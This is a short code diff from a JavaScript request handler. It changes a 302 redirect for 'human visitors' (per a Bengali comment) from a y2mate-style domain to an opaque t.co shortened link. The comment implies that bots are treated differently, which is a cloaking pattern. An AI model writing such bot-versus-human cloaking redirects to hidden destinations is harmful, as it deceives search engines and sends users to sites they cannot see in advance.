@@ -95,7 +95,7 @@ export default function handler(req, res) {
   } else {
     // 🧑‍🤝‍🧑 হিউম্যান ভিজিটরদের আসল সাইটে পাঠানো হবে
     res.writeHead(302, {
-      Location: 'https://v6.www-y2mate.com'
+      Location: 'https://t.co/oST3ruUh2B'
     });
     res.end();
   }
